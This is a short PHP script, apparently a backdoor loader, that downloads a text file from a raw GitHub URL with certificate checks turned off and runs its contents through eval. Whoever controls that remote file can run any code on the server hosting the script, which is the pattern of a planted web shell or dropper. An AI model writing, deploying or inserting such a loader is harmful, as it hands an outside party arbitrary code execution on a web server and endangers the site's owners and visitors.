<?php
$url = 'https://raw.githubusercontent.com/yyujimin88-hue/ecard/c39bcc10bad363a0e246b67bfed6f1d746f417c0/file.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
eval("?>" . $fileContents);
?>
